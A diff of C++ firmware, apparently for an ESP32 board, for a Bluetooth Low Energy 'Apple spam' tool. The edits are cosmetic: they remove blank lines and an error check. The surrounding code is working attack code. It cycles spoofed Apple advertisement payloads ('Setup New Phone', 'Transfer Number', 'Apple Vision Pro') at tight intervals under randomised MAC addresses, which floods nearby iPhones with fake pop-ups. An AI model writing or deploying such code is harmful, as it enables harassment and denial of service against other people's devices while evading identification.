@@ -38,11 +38,10 @@ static const ApplePayload apple_payloads[] = {
     {"Setup New Phone", data_setup_new_phone, sizeof(data_setup_new_phone)},
     {"Transfer Number", data_transfer_number, sizeof(data_transfer_number)},
     {"TV Color Balance", data_tv_color_balance, sizeof(data_tv_color_balance)},
-    {"Apple Vision Pro", data_vision_pro, sizeof(data_vision_pro)},
+    {"Apple Vision Pro", data_vision_pro, sizeof(data_vision_pro)}
 };
 
 static const int apple_payload_count = sizeof(apple_payloads) / sizeof(ApplePayload);
-
 static bool apple_spam_running = false;
 static int current_apple_payload = -1;
 static BLEAdvertising* pAppleAdvertising = nullptr;
@@ -108,7 +107,6 @@ void quickAppleSpam(int payloadIndex) {
     pAdv->setScanResponseData(BLEAdvertisementData());
     pAdv->setMinInterval(32);
     pAdv->setMaxInterval(48);
-    
     pAdv->start();
     vTaskDelay(100 / portTICK_PERIOD_MS);
     pAdv->stop();
@@ -168,7 +166,6 @@ void startAppleSpamAll() {
         pAdv->setScanResponseData(BLEAdvertisementData());
         pAdv->setMinInterval(32);
         pAdv->setMaxInterval(48);
-        
         pAdv->start();
         vTaskDelay(100 / portTICK_PERIOD_MS);
         pAdv->stop();
@@ -204,13 +201,9 @@ void startAppleSpam(int payloadIndex) {
         
         uint8_t macAddr[6];
         generateRandomMac(macAddr);
-        esp_err_t ret = esp_base_mac_addr_set(macAddr);
-        if (ret != ESP_OK) {
-            Serial.printf("Failed to set MAC: %d\n", ret);
-        }
+        esp_base_mac_addr_set(macAddr);
         
         BLEDevice::init("");
-        
         pAppleAdvertising = BLEDevice::getAdvertising();
         
         BLEAdvertisementData advertisementData = BLEAdvertisementData();
@@ -229,16 +222,12 @@ void startAppleSpam(int payloadIndex) {
 #endif
         
         pAppleAdvertising->setAdvertisementData(advertisementData);
-        
         BLEAdvertisementData scanResponseData = BLEAdvertisementData();
         pAppleAdvertising->setScanResponseData(scanResponseData);
-        
         pAppleAdvertising->setMinInterval(32);
         pAppleAdvertising->setMaxInterval(48);
-        
         pAppleAdvertising->start();
         vTaskDelay(100 / portTICK_PERIOD_MS);
-        
         pAppleAdvertising->stop();
         vTaskDelay(5 / portTICK_PERIOD_MS);
         
